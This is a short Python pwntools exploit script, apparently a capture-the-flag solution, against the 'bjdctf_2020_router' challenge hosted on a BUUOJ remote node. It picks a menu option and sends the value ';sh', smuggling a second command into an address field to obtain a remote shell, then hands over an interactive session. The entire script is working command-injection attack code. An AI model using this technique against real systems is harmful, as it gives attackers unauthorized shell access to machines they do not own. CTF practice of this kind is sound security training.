#Made by fly_autumn
#x86 RCE
from pwn import *
#p = process("./bjdctf_2020_router")
p = remote("node5.buuoj.cn",28420)
elf = ELF("./bjdctf_2020_router")
context(os="linux",arch="i386")

p.recvuntil(b"choose:\n")
p.sendline(b"1")
p.recvuntil(b"address:\n")
p.sendline(b";sh")

p.interactive()
